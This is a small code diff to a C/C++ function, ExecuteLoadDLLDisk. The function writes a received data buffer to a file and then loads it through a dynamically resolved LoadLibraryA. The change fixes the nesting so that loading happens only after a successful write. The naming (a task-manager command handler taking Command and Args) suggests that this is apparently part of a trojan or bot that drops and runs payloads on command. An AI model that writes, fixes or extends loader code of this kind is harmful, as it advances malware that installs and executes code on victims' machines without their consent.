@@ -721,12 +721,13 @@ bool ExecuteLoadDLLDisk(PTaskManager, PCHAR Command, PCHAR Args)
 			data = 0;
 	bool res = false;
 	if( data )
-		if( File::WriteBufferA( fileName, data, size ) == size )
-	if( data )
 	{
-		HMODULE dll = (HMODULE)pLoadLibraryA(fileName);
-		if( dll )
-			res = true;
+		if( File::WriteBufferA( fileName, data, size ) == size )
+		{
+			HMODULE dll = (HMODULE)pLoadLibraryA(fileName);
+			if( dll )
+				res = true;
+		}
 		MemFree(data);
 	}
 	return res;
